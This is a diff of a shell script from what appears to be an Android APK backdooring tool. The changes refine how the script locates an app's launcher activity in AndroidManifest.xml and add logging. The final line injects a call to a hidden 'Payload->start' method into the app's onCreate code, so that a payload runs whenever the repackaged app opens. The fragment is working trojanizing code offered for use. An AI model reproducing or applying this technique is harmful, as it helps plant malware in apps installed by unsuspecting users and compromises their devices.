@@ -95,17 +95,22 @@ fi
 
 echo -n "[*] Locating smali file to hook in original project...";
 total_package=`head -n 2 $MY_PATH/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
-tmp=`grep -B 3 "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B 2 "android.intent.action.MAIN"|grep -m 1 "<activity"|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
+launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |awk -F ":" '{ print $1 }'`
+echo "Found launcher line in manifest file: $launcher_line_num" >>$LOG_FILE 2>&1
+activity_line_count=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |grep -c "<activity"`
+echo "Activity lines found above launcher line: $activity_line_count" >>$LOG_FILE 2>&1
+tmp=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
+echo "Value of tmp: $tmp" >>$LOG_FILE 2>&1
 smali_file_to_hook=$MY_PATH/original/smali/$tmp.smali
 if [ ! -f $smali_file_to_hook ]; then
   smali_file_to_hook=$MY_PATH/original/smali/$total_package$tmp.smali
 fi
+echo "The smali file to hook: $smali_file_to_hook" >> $LOG_FILE 2>&1
 echo "done.";
 if [ ! -f $smali_file_to_hook ]; then
   echo "[!] Failed to locate smali file to hook";
   exit 1;
 fi
-echo "[+] Original smali file to hook: $smali_file_to_hook";
 
 echo -n "[*] Adding hook in original smali file...";
 sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, Lnet\/'"$payload_primary_dir"'\/'"$payload_sub_dir"'\/Payload;->start(Landroid\/content\/Context;)V' $smali_file_to_hook >>$LOG_FILE 2>&1
